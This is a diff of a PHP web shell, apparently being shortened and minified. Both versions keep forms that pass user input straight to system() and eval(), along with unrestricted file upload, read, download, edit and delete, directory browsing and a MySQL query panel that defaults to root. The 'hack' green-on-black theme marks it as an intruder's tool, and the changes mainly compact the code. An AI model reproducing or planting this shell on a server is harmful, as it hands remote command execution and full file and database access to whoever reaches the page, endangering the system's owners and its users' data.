@@ -1,6 +1,6 @@
 <?php
 error_reporting(E_ERROR);
-$darkmode = false;
+$dark = false;
 
 if(!empty($_GET['dl']) )
 {
@@ -16,20 +16,15 @@ if(!empty($_GET['dl']) )
 	else
 		echo '<b>Error reading file ' . $f . '</b>';
 }
-?>
-<!DOCTYPE html>
-<html class="<?=($darkmode)?'hack':'';?>"><head><meta charset="utf-8"></head>
-<body><style type="text/css">
-html {font-size: 12px;font-family: "Lucida Console", Courier, monospace;}
-.container { min-width: 600px; }
-.row [class^="col"] { float: left; min-height: 0.125rem;}
+echo '<!DOCTYPE html><html class="'.(($dark)?'h':'').'"><head><meta charset="utf-8"></head>
+<body><style type="text/css">html {font-size: 12px;font-family: "Lucida Console", Courier, monospace;}
 .row::after { content: "";display: table; clear: both;}
-.alt1 { background-color: #bbbbbb; color: #000; }
-.alt2 { background-color: #eeeeee; color: #000; }
-@media only screen and (min-width: 25em) { .col-1 { width: 85px; } .col-2 { width: 150px; overflow: hidden; text-overflow: ellipsis; } .col-3 { width: 80px; } .col-4 { width: 250px; } }
-.code { width: 800px; height:400px; border:1px solid #000; overflow: auto; resize: both; }
-.hack { background-color: #000; color: #00FF00; }</style>
-<?php
+.a1 { background: #bbb; color: #000; } .a2 { background: #eee; color: #000; }
+@media only screen and (min-width: 25em) { c1,c2,c3,c4 { display: block; float:left; min-height: 0.125rem; }
+c1 { width: 85px; } c2 { width: 150px; overflow: hidden; text-overflow: ellipsis; } c4 { width: 250px; } }
+.c { width: 800px; height:400px; border:1px solid #000; overflow: auto; resize: both; }
+.h { background: #000; color: #00FF00; }</style>';
+
 
 function GetPerms($p)
 {
@@ -51,19 +46,18 @@ if(!empty($_POST['cmd'])) { echo "<pre>"; system($_POST['cmd']); echo "</pre>"; 
 
 if(!empty($_POST['php'])) { echo '<pre>'; eval($_POST['php']); echo '</pre>'; }
 
-if(!empty($_FILES['f']))
+if(!empty($_FILES['f']['name']))
 {
-	if(empty($_POST['dir'])) { $_POST['dir'] = '.'; }
-	$dir = $_POST['dir'] . '/' . $_FILES['f']['name'];
-	echo '<b>' . ((move_uploaded_file($_FILES['f']['tmp_name'], $dir)) ? 'Successfully uploaded ' : 'Error uploading ') . $dir .'</b>';
+	$d = ((!empty($_POST['dir'])) ? $_POST['dir']:'.')  . '/' . $_FILES['f']['name'];
+	echo '<b>' . ((move_uploaded_file($_FILES['f']['tmp_name'], $d)) ? 'Successfully uploaded ' : 'Error uploading ') . $d .'</b>';
 }
 
-if(!empty($_GET['read']))
+$f = (!empty($_GET['read'])) ? $_GET['read'] : ((!empty($_POST['read'])) ? $_POST['read'] : false);
+if($f)
 {
-	$f = $_GET['read'];
 	echo '<b>Reading file ' . realpath($f) .'</b><br>';
 	$strFile = highlight_file($f, true);
-	echo (($strFile === false) ? "<b>Error opening ". $f . '</b>' : '<div class="code">'. $strFile .'</div>');
+	echo (($strFile === false) ? "<b>Error opening ". $f . '</b>' : '<div class="c">'. $strFile .'</div>');
 }
 
 if(!empty($_POST['write']))
@@ -100,24 +94,24 @@ if(!empty($_GET['dir']))
 {
 	if ($h = opendir($dir)) 
 	{
-		echo "<br><br><b>Listing of " . realpath($dir) . '</b><br><br><div class="container">';
+		echo "<br><br><b>Listing of " . realpath($dir) . '</b><br><br><div style="min-width: 600px">';
 		$i = 0;
 
 		while ($x = readdir($h))
 		{
 			$f = $dir.'/'.$x;
 			
-			echo '<div class="row '. ((++$i % 2 == 0) ? 'alt1':'alt2') .'"><div class="col-1">';
-			echo GetPerms(fileperms($f)) . ' </div><div class="col-2">';
+			echo '<div class="row '. ((++$i % 2 == 0) ? 'a1':'a2') .'"><c1>';
+			echo GetPerms(fileperms($f)) . ' </c1><c2>';
 
-			if (is_dir($f)) echo $x . "</div><div class='col-3'></div><div class='col-4'> [<a href='$f'>open</a>] [<a href='?dir=$f'>browse</a>]";
+			if (is_dir($f)) echo $x . "</c2><c1></c1><c4> [<a href='$f'>open</a>] [<a href='?dir=$f'>browse</a>]";
 
-			else echo $x . "</div><div class='col-3'> (". GetSize(filesize($f)) .") </div><div class='col-4'>
+			else echo $x . "</c2><c1> (". GetSize(filesize($f)) .") </c1><c4>
 							[<a href='$f'>open</a>] [<a href='?dir=$dir&read=$f'>read</a>] 
 							[<a href='?dir=$dir&dl=$f'>dl</a>] [<a href='?dir=$dir&edit=$f'>edit</a>] 
 							[<a href='?dir=$dir&delete=$f' onclick='return confirm(\"Are you sure?\")'>delete</a>]";
 			
-			echo '</div></div>';
+			echo '</c4></div>';
 		}
 
 		echo '</div>';
@@ -127,17 +121,11 @@ if(!empty($_GET['dir']))
 		echo "<b>Can't open directory ". realpath($dir) ."</b>";
 }
 
-$server = (!empty($_POST['server'])) ? $_POST['server'] : '127.0.0.1';
-$port = (!empty($_POST['port'])) ? $_POST['port'] : '3306';
-$user = (!empty($_POST['user'])) ? $_POST['user'] : 'root';
-$pwd = $_POST['pwd'];
-$db = $_POST['db'];
-
-$filename = $content = '';
+$f = $c = '';
 if(isset($_GET['edit']))
 {
-	$filename = realpath($_GET['edit']);
-	$content = htmlentities(file_get_contents($filename));
+	$f = realpath($_GET['edit']);
+	$c = htmlentities(file_get_contents($f));
 }
 ?>
 
@@ -146,55 +134,31 @@ if(isset($_GET['edit']))
 <a href="?dir=.">browse here</a><br><br>
 
 <form action="?dir=<?=$dir;?>" METHOD="POST">
-	Execute command<br>
-	<input type="text" name="cmd" placeholder="ls -al">
-	<input type="submit"><br>
-</form><br><br>
-
+CMD <input type="text" name="cmd" placeholder="ls -al"><input type="submit">
+</form><br>
 <form action="?dir=<?=$dir;?>" METHOD="POST">
-	Execute PHP<br>
-	<input type="text" name="php" placeholder="phpinfo();">
-	<input type="submit">
-</form><br><br>
-
-<form action="?dir=<?=$dir;?>" method="POST" enctype="multipart/form-data">
-	Upload file<br>
-	<input name="f" type="file"> to dir: <input type="text" name="dir" value="." placeholder="optional path">
-	<input type="submit" value="upload">
-</form><br><br>
-
-<form action="" METHOD="GET">
-	Download file<br>
-	<input type="text" name="dl" placeholder="filename">
-	<input type="hidden" name="dir" value="<?=$dir;?>">
-	<input type="submit">
-</form><br><br>
-
-<form action="" METHOD="GET">
-	Read file<br>
-	<input type="text" name="read" placeholder="filename">
-	<input type="hidden" name="dir" value="<?=$dir;?>">
-	<input type="submit">
-</form><br><br>
-
+PHP <input type="text" name="php" placeholder="phpinfo();"><input type="submit">
+</form><br>
+<form action="?dir=<?=$dir;?>" METHOD="POST" enctype="multipart/form-data">
+Upload <input name="f" type="file"> to dir: <input type="text" name="dir" value="." placeholder="path"><input type="submit">
+</form><br>
+<form action="?dir=<?=$dir;?>" METHOD="GET">
+Download <input type="text" name="dl" placeholder="file"><input type="submit">
+</form><br>
 <form action="?dir=<?=$dir;?>" METHOD="POST">
-	Write file<br>
-	<input type="text" name="write" placeholder="filename" value="<?=$filename; ?>"><br>
-	<textarea name="content" cols="100" rows="10" placeholder="content"><?=$content; ?></textarea>
-	<input type="submit">
-</form><br><br>
-
-<form action="" METHOD="POST">
-	MySQL query<br>
-	<input type="text" name="server" value="<?=$server; ?>" placeholder="127.0.0.1">
-	<input type="text" name="port" value="<?=$port; ?>" placeholder="3306"><br>
-	<input type="text" name="user" value="<?=$user; ?>" placeholder="root">
-	<input type="text" name="pwd" value="<?=$pwd; ?>" placeholder="password"><br>
-	<input type="text" name="db" value="<?=$db; ?>" placeholder="database"><br>
-
-	<textarea name="query" cols="80" rows="5" placeholder="query"></textarea>
-	<input type="submit">
+Read <input type="text" name="read" placeholder="file"><input type="submit">
+</form><br>
+<form action="?dir=<?=$dir;?>" METHOD="POST">
+Write <input type="text" name="write" placeholder="file" value="<?=$f; ?>"><br>
+<textarea name="content" cols="100" rows="10" placeholder="content"><?=$c; ?></textarea><input type="submit">
+</form><br>
+<form action="?dir=<?=$dir;?>" METHOD="POST">
+MySQL<br>
+<input type="text" name="server" value="<?=(!empty($_POST['server'])) ? $_POST['server'] : '127.0.0.1'; ?>">
+<input type="text" name="port" value="<?=(!empty($_POST['port'])) ? $_POST['port'] : '3306'; ?>"><br>
+<input type="text" name="user" value="<?=(!empty($_POST['user'])) ? $_POST['user'] : 'root'; ?>">
+<input type="text" name="pwd" value="<?=$_POST['pwd']; ?>" placeholder="password"><br>
+<input type="text" name="db" value="<?=$_POST['db']; ?>" placeholder="database"><br>
+<textarea name="query" cols="80" rows="5" placeholder="query"></textarea><input type="submit">
 </form>
-
-</body>
-</html>
+</body></html>
